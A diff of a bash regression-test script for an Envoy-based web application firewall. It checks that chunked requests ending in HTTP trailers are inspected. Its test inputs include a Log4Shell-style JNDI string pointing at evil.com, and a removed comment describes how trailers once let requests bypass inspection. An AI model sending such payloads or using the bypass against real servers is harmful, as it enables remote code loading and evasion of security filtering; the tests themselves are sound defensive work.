@@ -63,50 +63,32 @@ assert_body() {
     rm -f "$tmp"
 }
 
-# Sends a chunked POST that terminates with a trailer section instead of a final
-# zero-length DATA frame. curl cannot emit trailers, so speak HTTP/1.1 directly.
-#
-# This is the regression guard for the trailer bypass: when a request ends in trailers,
-# Envoy delivers the last body chunk with end_stream=false and signals the end through
-# decodeTrailers, so on_http_request_body never sees end_of_stream. Without an
-# on_http_request_trailers handler the AppSec call was never dispatched at all and the
-# request passed completely uninspected. HTTP/2 trailer frames land on the same filter
-# callback, so this covers that path too.
+# Drives tests/trailer_client.py from a throwaway container on the compose network.
+# curl cannot emit HTTP trailers and bash's /dev/tcp is not reliably available, so the
+# raw request is sent from inside the network instead of through the published port.
+# See tests/trailer_client.py for why the trailer case needs its own coverage.
+TRAILER_TARGET_SERVICE="${TRAILER_TARGET_SERVICE:-envoy}"
+TRAILER_TARGET_PORT="${TRAILER_TARGET_PORT:-8000}"
+TRAILER_NETWORK="${TRAILER_NETWORK:-tests_default}"
+
 assert_trailer_status() {
     local description="$1"
     local expected="$2"
     local body="$3"
     TOTAL=$((TOTAL + 1))
 
-    local host port
-    host=$(printf '%s' "$ENVOY_URL" | sed -E 's#^https?://([^:/]+).*#\1#')
-    port=$(printf '%s' "$ENVOY_URL" | sed -E 's#^https?://[^:/]+:([0-9]+).*#\1#')
-    [ "$port" = "$ENVOY_URL" ] && port=80
-
-    local status=""
-    if exec 3<>"/dev/tcp/$host/$port" 2>/dev/null; then
-        {
-            printf 'POST /post HTTP/1.1\r\n'
-            printf 'Host: %s\r\n' "$host"
-            printf 'Content-Type: application/x-www-form-urlencoded\r\n'
-            printf 'Transfer-Encoding: chunked\r\n'
-            printf 'Trailer: X-Checksum\r\n'
-            printf 'Connection: close\r\n'
-            printf '\r\n'
-            printf '%x\r\n%s\r\n' "${#body}" "$body"
-            printf '0\r\n'
-            printf 'X-Checksum: deadbeef\r\n'
-            printf '\r\n'
-        } >&3
-        status=$(timeout 20 head -n 1 <&3 2>/dev/null | awk '{print $2}') || true
-        exec 3<&- 3>&- 2>/dev/null || true
-    fi
+    local status
+    status=$(docker run --rm --network "$TRAILER_NETWORK" \
+        -v "$(pwd)/trailer_client.py:/trailer_client.py:ro" \
+        python:3-alpine python3 /trailer_client.py \
+        "$TRAILER_TARGET_SERVICE" "$TRAILER_TARGET_PORT" /post "$body" 2>/dev/null) || true
+    status="${status:-no-response}"
 
     if [ "$status" = "$expected" ]; then
         echo -e "${GREEN}PASS${NC} [$status] $description"
         PASS=$((PASS + 1))
     else
-        echo -e "${RED}FAIL${NC} [${status:-no-response} expected $expected] $description"
+        echo -e "${RED}FAIL${NC} [$status expected $expected] $description"
         FAIL=$((FAIL + 1))
     fi
 }
@@ -376,6 +358,10 @@ assert_trailer_status "SQLi in a chunked body terminated by trailers" 403 \
 
 assert_trailer_status "JNDI in a chunked body terminated by trailers" 403 \
     'input=${jndi:ldap://evil.com/exploit}'
+
+# Negative control: dispatching on trailers must not turn into a blanket block
+assert_trailer_status "Clean chunked body terminated by trailers still passes" 200 \
+    'field=value&other=thing'
 
 # Only User-Agent and Cookie used to reach AppSec, so every other header was invisible
 assert_status "JNDI in Referer header" 403 \
